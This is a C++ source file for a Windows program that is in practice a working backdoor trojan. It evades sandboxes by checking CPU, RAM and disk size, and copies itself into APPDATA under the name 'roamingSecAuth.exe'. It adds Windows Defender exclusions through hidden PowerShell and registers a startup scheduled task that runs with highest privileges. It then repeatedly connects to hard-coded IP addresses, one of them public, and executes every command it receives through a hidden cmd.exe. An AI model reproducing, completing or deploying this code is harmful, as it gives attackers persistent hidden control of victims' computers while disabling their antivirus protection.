// tar.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <cstdlib>
#include <array>
#include <ws2tcpip.h>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include "enc_t.hpp"





#pragma comment(lib, "Ws2_32.lib")



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    //crypto::init_constants();
    namespace fs = std::filesystem;
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;

    
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return false;

    char appPath[MAX_PATH];
    char sysDir[MAX_PATH];

    const char* cstr = std::getenv("APPDATA");
    std::wstring wstr(cstr, cstr + strlen(cstr));
    std::string appDataPath(cstr);
    GetSystemDirectoryA(sysDir, MAX_PATH);
    GetModuleFileNameA(NULL, appPath, MAX_PATH);
    std::string currentPath(appPath);

    if (currentPath != (appDataPath + "\\roamingSecAuth.exe")) {

        std::wstring import = L"-Command \"Add-MpPreference -ExclusionPath '" + wstr + L"'\"";
        fs::path systemDirectory(wstr);
        fs::path targetFile = systemDirectory / "roamingSecAuth.exe";
        std::cout << targetFile.string() << std::endl;

        ShellExecuteW(NULL, L"runas", L"powershell.exe", import.c_str(), NULL, SW_HIDE);
        Sleep(5000);

        std::error_code ec;
        try {
            fs::copy_file(appPath, targetFile, fs::copy_options::overwrite_existing);
            std::cout << "copied: " << appPath << std::endl;
            std::cout << "TO: " << targetFile << std::endl;
        }
        catch (const fs::filesystem_error& e) {
            std::cerr << "Error Code: " << e.what() << "\n";
            std::cerr << "Message: " << e.code().message() << "\n";

            if (ec.value() == static_cast<int>(std::errc::permission_denied)) {
                std::cerr << "Resolution: Run this application as an Administrator.\n";
            }
            return 1;


        }




        ShellExecuteA(NULL, "runas", targetFile.string().c_str(), NULL, NULL, SW_HIDE);
        return 0;
    }
    

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring executablePath(exePath);

    std::wcout << executablePath << std::endl;
    std::wstring fileName = executablePath.substr(executablePath.find_last_of(L"\\/") + 1);
    std::wcout << fileName << std::endl;


    std::wstring command5 = L"/c schtasks /create /tn \"RoamingSecAuthority\" /tr \"" + executablePath + L"\" /sc ONSTART /rl HIGHEST /f";
    std::wcout << L"Creating scheduled task with command: " << command5 << std::endl;
    ShellExecuteW(NULL, L"runas", L"cmd.exe", command5.c_str(), NULL, SW_HIDE);

        std::wstring exactCommand = L"/c powershell -NoProfile -WindowStyle Hidden -Command "
            L"\"$p='" + executablePath + L"'; $n='" + fileName + L"'; "
            L"if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "
            L"Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList '-NoProfile -Command Add-MpPreference -ExclusionPath '\"'$p'\"' ; Add-MpPreference -ExclusionProcess '\"'$n'\"'' "
            L"} else { "
            L"Add-MpPreference -ExclusionPath $p ; Add-MpPreference -ExclusionProcess $n "
            L"}\"";

        ShellExecuteW(NULL, L"runas", L"cmd.exe", exactCommand.c_str(), NULL, SW_HIDE);


        WSADATA wsaData;
        FILE* fp;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            std::cout << "error";
        }

        addrinfo addrInfo;
        addrinfo* result = nullptr;
        SOCKET connectSocket = INVALID_SOCKET;
        //std::string ip = "10.130.114.35";
        std::string port = "8080";

        std::vector<std::string> list = { "192.168.0.45", "10.130.114.35", "58.104.99.223", "127.0.0.1" };
        bool connected = false;


        while (true) {
            if (connected == false) {
                for (int i = 0; i < list.size(); i++) {
                    Sleep(500);
                    if (result != nullptr) {
                        freeaddrinfo(result);
                        result = nullptr;
                    }
                    ZeroMemory(&addrInfo, sizeof(addrInfo));
                    addrInfo.ai_family = AF_INET;
                    addrInfo.ai_socktype = SOCK_STREAM;
                    addrInfo.ai_protocol = IPPROTO_TCP;
                    if (getaddrinfo(list[i].c_str(), port.c_str(), &addrInfo, &result) != 0) {
                        continue;
                    }


                    connectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
                    if (connectSocket == INVALID_SOCKET) {
                        Sleep(2000);
                        continue;
                    }

                    iResult = connect(connectSocket, result->ai_addr, (int)result->ai_addrlen);

                    if (iResult == SOCKET_ERROR) {
                        closesocket(connectSocket);
                        connectSocket = INVALID_SOCKET;
                        Sleep(1000);
                        continue;
                    }
                    else if (iResult == 0) {
                        connected = true;
                        break;
                    }



                }
            }
            //iResult = connect(connectSocket, result->ai_addr, (int)result->ai_addrlen);

            char buffer[512] = { 0 };
            char psBuffer[128];


            int receiveBytes;

            while ((receiveBytes = recv(connectSocket, buffer, sizeof(buffer) - 1, 0)) > 0) {

                std::string command(buffer, receiveBytes);
                std::cout << command << std::endl;


                std::string para = "/c " + command;
                ZeroMemory(buffer, sizeof(buffer));


                ShellExecuteA(NULL, "runas", "cmd.exe", para.c_str(), NULL, SW_HIDE);

                ZeroMemory(psBuffer, sizeof(psBuffer));

            }
            closesocket(connectSocket);
            connectSocket = INVALID_SOCKET;
            connected = false;
        }


        freeaddrinfo(result);
        closesocket(connectSocket);
        connectSocket = INVALID_SOCKET;
        WSACleanup();
        return 0;
    
}







/*
*/
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
